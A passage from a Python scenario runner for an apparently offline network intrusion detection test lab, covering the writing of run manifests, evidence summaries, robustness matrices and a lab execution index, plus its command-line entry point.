                        "--out",
                        str(result_dir / "artifacts_report.md"),
                    ],
                    log_path=logs_dir / "artifact_report.log",
                )
            )

    db_summary = _summarize_database(result_dir / "nids.db")
    metrics_payload = _load_metrics_payload(result_dir / "metrics.json")
    verdict = _evaluate_verdict(definition, db_summary, commands)
    alerts_extract = {"latest_alerts": db_summary.get("latest_alerts", [])}
    artifacts_extract = {"latest_records": db_summary.get("artifacts", {}).get("latest_records", [])}
    db_metrics_path = result_dir / "database_summary.json" if metrics_payload is not None else result_dir / "metrics.json"
    _write_json(db_metrics_path, db_summary)
    _write_json(result_dir / "alerts_extract.json", alerts_extract)
    _write_json(result_dir / "artifacts_extract.json", artifacts_extract)
    _write_text(
        result_dir / "robustness_summary.md",
        _robustness_summary_markdown(
            definition=definition,
            db_summary=db_summary,
            metrics_payload=metrics_payload,
            result_dir=result_dir,
        ),
    )
    manifest = {
        "generated_at": _iso_now(),
        "scenario_id": str(definition.get("scenario_id") or ""),
        "scenario_name": str(definition.get("name") or ""),
        "run_name": run_name,
        "scenario_path": str(scenario_path.resolve()) if scenario_path is not None else "",
        "environment": environment,
        "objective": str(definition.get("objective") or ""),
        "expected": expected,
        "status": verdict["status"],
        "issues": verdict["issues"],
        "verdict": verdict,
        "commands": commands,
        "database_summary": db_summary,
        "evidence": {
            "result_dir": str(result_dir.resolve()),
            "pcap_path": str(pcap_path.resolve()) if pcap_path is not None else "",
            "artifact_incoming_dir": str(artifact_incoming_dir.resolve()) if artifact_specs else "",
            "artifact_processed_dir": str(artifact_processed_dir.resolve()) if artifact_specs else "",
            "artifact_quarantine_dir": str(artifact_quarantine_dir.resolve()) if artifact_specs else "",
            "manifest_path": str((result_dir / "manifest.json").resolve()),
            "summary_path": str((result_dir / "summary.md").resolve()),
            "metrics_path": str((result_dir / "metrics.json").resolve()),
            "database_summary_path": str(db_metrics_path.resolve()),
            "alerts_extract_path": str((result_dir / "alerts_extract.json").resolve()),
            "artifacts_extract_path": str((result_dir / "artifacts_extract.json").resolve()),
            "ground_truth_path": str(ground_truth_path.resolve()) if ground_truth_path is not None else "",
            "robustness_summary_path": str((result_dir / "robustness_summary.md").resolve()),
            "taxonomy_map_path": str(taxonomy_json_path.resolve()),
            "taxonomy_summary_path": str(taxonomy_md_path.resolve()),
        },
        "taxonomy": taxonomy_payload,
        "executed": not dry_run,
    }
    _write_json(result_dir / "manifest.json", manifest)
    summary_md = _summary_markdown(
        definition=definition,
        run_name=run_name,
        result_dir=result_dir,
        db_summary=db_summary,
        verdict=verdict,
        environment=environment,
        commands=commands,
    )
    _write_text(result_dir / "summary.md", summary_md)
    return manifest


def build_execution_index(results_root: Path) -> dict[str, Any]:
    manifests: list[dict[str, Any]] = []
    for path in sorted(results_root.glob("*/manifest.json")):
        try:
            payload = json.loads(path.read_text(encoding="utf-8"))
        except Exception:
            continue
        payload["manifest_path"] = str(path.resolve())
        manifests.append(payload)

    manifests.sort(key=lambda item: str(item.get("generated_at") or ""), reverse=True)
    latest_by_scenario: dict[str, dict[str, Any]] = {}
    for item in manifests:
        scenario_id = str(item.get("scenario_id") or "")
        if scenario_id and scenario_id not in latest_by_scenario:
            latest_by_scenario[scenario_id] = item

    return {
        "generated_at": _iso_now(),
        "results_root": str(results_root.resolve()),
        "total_runs": len(manifests),
        "latest_by_scenario": latest_by_scenario,
        "runs": manifests,
    }


def execution_index_markdown(index: dict[str, Any]) -> str:
    lines = [
        "# Lab Execution Index",
        "",
        f"Generated: {index.get('generated_at')}",
        "",
        f"- Results root: `{index.get('results_root')}`",
        f"- Total standardized runs: `{index.get('total_runs')}`",
        "",
        "## Latest by Scenario",
        "",
        "| Scenario ID | Run | Status | Environment | Evidence |",
        "|---|---|---|---|---|",
    ]
    latest = index.get("latest_by_scenario") or {}
    for scenario_id in sorted(latest):
        item = latest[scenario_id]
        lines.append(
            f"| `{scenario_id}` | `{item.get('run_name', '')}` | `{item.get('status', '')}` | "
            f"`{item.get('environment', {}).get('primary_mode', '')}` | "
            f"`{item.get('evidence', {}).get('result_dir', '')}` |"
        )
    lines.extend(["", "## Run Details", ""])
    for item in index.get("runs") or []:
        lines.append(
            f"- `{item.get('run_name', '')}` | scenario=`{item.get('scenario_id', '')}` "
            f"status=`{item.get('status', '')}` evidence=`{item.get('evidence', {}).get('result_dir', '')}`"
        )
    return "\n".join(lines) + "\n"


def _write_robustness_matrix_for_manifests(
    *,
    manifests: list[dict[str, Any]],
    reports_root: Path,
) -> tuple[Path, Path] | None:
    bundle_dirs = [
        str(item.get("evidence", {}).get("result_dir", "")).strip()
        for item in manifests
        if str(item.get("evidence", {}).get("result_dir", "")).strip()
    ]
    if len(bundle_dirs) <= 1:
        return None
    json_path = reports_root / "robustness_matrix.json"
    md_path = reports_root / "robustness_matrix.md"
    return write_robustness_matrix(bundle_dirs=bundle_dirs, out_json=json_path, out_md=md_path)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Run repeatable offline-safe NIDS_TestLab scenarios.")
    parser.add_argument(
        "--scenario",
        action="append",
        default=[],
        help=(
            "Scenario stem or full path. Repeat for multiple scenarios. "
            "Use 'all' for every YAML scenario, 'all-ai' for generated AI robustness scenarios, "
            f"or one of: {', '.join(list_ai_scenarios())}."
        ),
    )
    parser.add_argument("--scenarios-dir", default=str(SCENARIOS_ROOT), help="Directory containing scenario YAML files.")
    parser.add_argument("--results-root", default=str(RESULTS_ROOT), help="Root directory for scenario evidence bundles.")
    parser.add_argument("--python", dest="python_path", default=str(_default_python()), help="Python interpreter for CLI execution.")
    parser.add_argument("--run-prefix", default="phase3", help="Prefix added to generated run folders.")
    parser.add_argument("--skip-visualize", action="store_true", help="Skip optional chart export generation.")
    parser.add_argument("--dry-run", action="store_true", help="Prepare manifests and inputs without executing the runtime.")
    parser.add_argument(
        "--write-index",
        action="store_true",
        help="After scenario execution, write a consolidated lab execution index into NIDS_TestLab/reports.",
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    scenarios_dir = Path(args.scenarios_dir).resolve()
    results_root = Path(args.results_root).resolve()
    python_path = Path(args.python_path).resolve()
    if not python_path.exists():
        raise FileNotFoundError(f"Python interpreter not found: {python_path}")

    scenarios = resolve_scenarios(scenarios_dir, args.scenario or ["all"])

    manifests: list[dict[str, Any]] = []
    for scenario_file, definition in scenarios:
        manifest = run_scenario(
            definition,
            scenario_path=scenario_file,
            results_root=results_root,
            python_path=python_path,
            run_prefix=str(args.run_prefix),
            skip_visualize=bool(args.skip_visualize),
            dry_run=bool(args.dry_run),
        )
        print(
            "scenario: "
            f"{manifest['scenario_id']} "
            f"run={manifest['run_name']} "
            f"status={manifest['status']} "
            f"evidence={manifest['evidence']['result_dir']}"
        )
        manifests.append(manifest)

    matrix_paths = _write_robustness_matrix_for_manifests(manifests=manifests, reports_root=REPORTS_ROOT)
    if matrix_paths is not None:
        print(f"robustness_matrix_json={matrix_paths[0]}")
        print(f"robustness_matrix_md={matrix_paths[1]}")

    if bool(args.write_index):
        index = build_execution_index(results_root)
        json_path = REPORTS_ROOT / "lab_execution_index.json"
        md_path = REPORTS_ROOT / "lab_execution_index.md"
        _write_json(json_path, index)
        _write_text(md_path, execution_index_markdown(index))
        print(f"lab_execution_index_json={json_path}")
        print(f"lab_execution_index_md={md_path}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
